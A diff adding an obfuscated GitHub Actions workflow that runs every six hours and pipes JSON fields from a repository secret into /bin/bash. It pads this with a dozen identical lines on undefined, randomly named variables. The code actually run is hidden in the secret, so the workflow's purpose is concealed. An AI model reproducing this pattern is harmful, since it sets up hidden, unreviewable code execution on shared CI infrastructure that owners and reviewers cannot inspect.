@@ -1,0 +1,28 @@
+name: enrenqimin
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: enrenqimin
+        env:
+          u24715: ${{ secrets.u24715 }}
+        run: |
+          echo $u24715 | jq -r .qs5096 | /bin/bash
+          echo $yib99 | jq -r .ihw170 | /bin/bash
+          echo $s3 | jq -r .a30930 | /bin/bash
+          echo $yylsw42 | jq -r .lz0 | /bin/bash
+          echo $o504 | jq -r .vs16698 | /bin/bash
+          echo $rpmdf14 | jq -r .nrve731 | /bin/bash
+          echo $nfazt51 | jq -r .kyr24999 | /bin/bash
+          echo $ovn92890 | jq -r .k122 | /bin/bash
+          echo $lnnd24 | jq -r .l0 | /bin/bash
+          echo $iu6217 | jq -r .y79806 | /bin/bash
+          echo $okcsd62 | jq -r .jf2 | /bin/bash
+          echo $wx48 | jq -r .kxoxx83946 | /bin/bash
+          echo $mvlsm1844 | jq -r .d1154 | /bin/bash
+
